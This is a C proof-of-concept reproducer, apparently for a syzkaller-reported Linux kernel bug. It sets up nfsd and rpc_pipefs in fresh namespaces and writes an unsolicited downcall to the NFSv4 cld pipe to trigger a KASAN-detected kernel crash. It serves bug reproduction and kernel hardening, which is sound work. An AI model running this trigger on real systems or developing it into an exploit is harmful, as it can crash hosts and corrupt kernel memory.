// https://syzkaller.appspot.com/bug?id=3ba4633d0436eca889af88d972c1e271a3f3ed7a
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sched.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <stdint.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <pthread.h>

/* Representation of long-form NFSv4 client ID */
struct cld_name {
	uint16_t cn_len;
	uint8_t cn_id[1024];
} __attribute__((packed));

/* Message struct for communication with userspace */
struct cld_msg {
	uint8_t		cm_vers;
	uint8_t		cm_cmd;
	int16_t		cm_status;
	uint32_t	cm_xid;
	union {
		int64_t		cm_gracetime;
		struct cld_name	cm_name;
		uint8_t		cm_version;
	} __attribute__((packed)) cm_u;
} __attribute__((packed));

void *nfsd_starter(void *arg)
{
	int fd;

	/* Disable NFSv2/v3 to avoid rpcbind dependency */
	fd = open("/tmp/nfsd/versions", O_WRONLY);
	if (fd >= 0) {
		if (write(fd, "-2 -3 +4\n", 9) < 0) {
			printf("[-] write versions failed: %s\n", strerror(errno));
			exit(1);
		}
		close(fd);
		printf("[+] Disabled NFSv2/v3.\n");
	} else {
		printf("[-] open /tmp/nfsd/versions failed: %s\n", strerror(errno));
		exit(1);
	}

	/* Set nfsv4leasetime to 10 seconds */
	fd = open("/tmp/nfsd/nfsv4leasetime", O_WRONLY);
	if (fd >= 0) {
		if (write(fd, "10\n", 3) < 0) {
			printf("[-] write nfsv4leasetime failed: %s\n", strerror(errno));
			exit(1);
		}
		close(fd);
		printf("[+] Set nfsv4leasetime to 10.\n");
	} else {
		printf("[-] open /tmp/nfsd/nfsv4leasetime failed: %s\n", strerror(errno));
		exit(1);
	}

	/* Configure a listener */
	fd = open("/tmp/nfsd/portlist", O_WRONLY);
	if (fd >= 0) {
		if (write(fd, "tcp 2049\n", 9) < 0) {
			printf("[-] write portlist failed: %s\n", strerror(errno));
			exit(1);
		}
		close(fd);
		printf("[+] Configured nfsd portlist.\n");
	} else {
		printf("[-] open /tmp/nfsd/portlist failed: %s\n", strerror(errno));
		exit(1);
	}

	/* Start nfsd threads */
	fd = open("/tmp/nfsd/threads", O_WRONLY);
	if (fd >= 0) {
		if (write(fd, "1\n", 2) < 0) {
			printf("[-] write threads failed: %s\n", strerror(errno));
			exit(1);
		}
		close(fd);
		printf("[+] Started nfsd threads.\n");
	} else {
		printf("[-] open /tmp/nfsd/threads failed: %s\n", strerror(errno));
		exit(1);
	}
	return NULL;
}

int main(void)
{
	/* Isolate namespaces to ensure a fresh nfsd state */
	if (unshare(CLONE_NEWNET | CLONE_NEWNS) < 0) {
		if (unshare(CLONE_NEWNET | CLONE_NEWNS | CLONE_NEWUSER) < 0) {
			printf("[-] unshare failed: %s\n", strerror(errno));
			exit(1);
		}
	}
	printf("[+] unshare successful.\n");

	/* Bring up loopback interface to avoid ENETUNREACH when starting nfsd */
	int sock = socket(AF_INET, SOCK_DGRAM, 0);
	if (sock >= 0) {
		struct ifreq ifr;
		memset(&ifr, 0, sizeof(ifr));
		strcpy(ifr.ifr_name, "lo");
		if (ioctl(sock, SIOCGIFFLAGS, &ifr) < 0) {
			printf("[-] ioctl SIOCGIFFLAGS failed: %s\n", strerror(errno));
			exit(1);
		}
		ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
		if (ioctl(sock, SIOCSIFFLAGS, &ifr) < 0) {
			printf("[-] ioctl SIOCSIFFLAGS failed: %s\n", strerror(errno));
			exit(1);
		}
		close(sock);
		printf("[+] loopback interface is up.\n");
	} else {
		printf("[-] socket failed: %s\n", strerror(errno));
		exit(1);
	}

	if (mkdir("/tmp/rpc_pipefs", 0777) < 0 && errno != EEXIST) {
		printf("[-] mkdir rpc_pipefs failed: %s\n", strerror(errno));
		exit(1);
	}
	printf("[+] mkdir rpc_pipefs successful.\n");

	if (mount("rpc_pipefs", "/tmp/rpc_pipefs", "rpc_pipefs", 0, NULL) < 0) {
		printf("[-] mount rpc_pipefs failed: %s\n", strerror(errno));
		exit(1);
	}
	printf("[+] mount rpc_pipefs successful.\n");

	if (mkdir("/tmp/nfsd", 0777) < 0 && errno != EEXIST) {
		printf("[-] mkdir nfsd failed: %s\n", strerror(errno));
		exit(1);
	}
	printf("[+] mkdir nfsd successful.\n");

	if (mount("nfsd", "/tmp/nfsd", "nfsd", 0, NULL) < 0) {
		printf("[-] mount nfsd failed: %s\n", strerror(errno));
		exit(1);
	}
	printf("[+] mount nfsd successful.\n");

	/* Start nfsd in a new thread so its stack can be freed */
	pthread_t tid;
	if (pthread_create(&tid, NULL, nfsd_starter, NULL) != 0) {
		printf("[-] pthread_create failed: %s\n", strerror(errno));
		exit(1);
	}
	printf("[+] nfsd starter thread created.\n");

	/* Wait for the cld pipe to be created by nfsd4_cld_tracking_init */
	int pipe_fd = -1;
	int retries = 500;
	while (pipe_fd < 0 && retries-- > 0) {
		pipe_fd = open("/tmp/rpc_pipefs/nfsd/cld", O_RDWR);
		if (pipe_fd < 0) usleep(10000);
	}
	if (pipe_fd < 0) {
		printf("[-] open cld pipe failed: %s\n", strerror(errno));
		exit(1);
	}
	printf("[+] cld pipe opened successfully.\n");

	/* Prepare a valid downcall for the first upcall (Cld_GetVersion, xid=0) */
	struct cld_msg msg;
	memset(&msg, 0, sizeof(msg));
	msg.cm_vers = 1;
	msg.cm_cmd = 5; /* Cld_GetVersion */
	msg.cm_status = 0;
	msg.cm_xid = 0;
	msg.cm_u.cm_version = 1;

	/* Write the downcall WITHOUT reading the upcall. */
	retries = 10000;
	int success = 0;
	while (retries-- > 0) {
		ssize_t ret = write(pipe_fd, &msg, sizeof(msg));
		if (ret == sizeof(msg)) {
			printf("[+] First downcall written successfully.\n");
			success = 1;
			break;
		}
		usleep(1000);
	}
	if (!success) {
		printf("[-] First downcall failed.\n");
		exit(1);
	}

	/* The kernel should crash shortly after the first downcall is processed,
	 * when it tries to queue the second upcall (Cld_GraceStart).
	 * We wait a bit to ensure the crash happens. */
	printf("[+] Waiting for KASAN crash...\n");
	sleep(5);

	return 0;
}
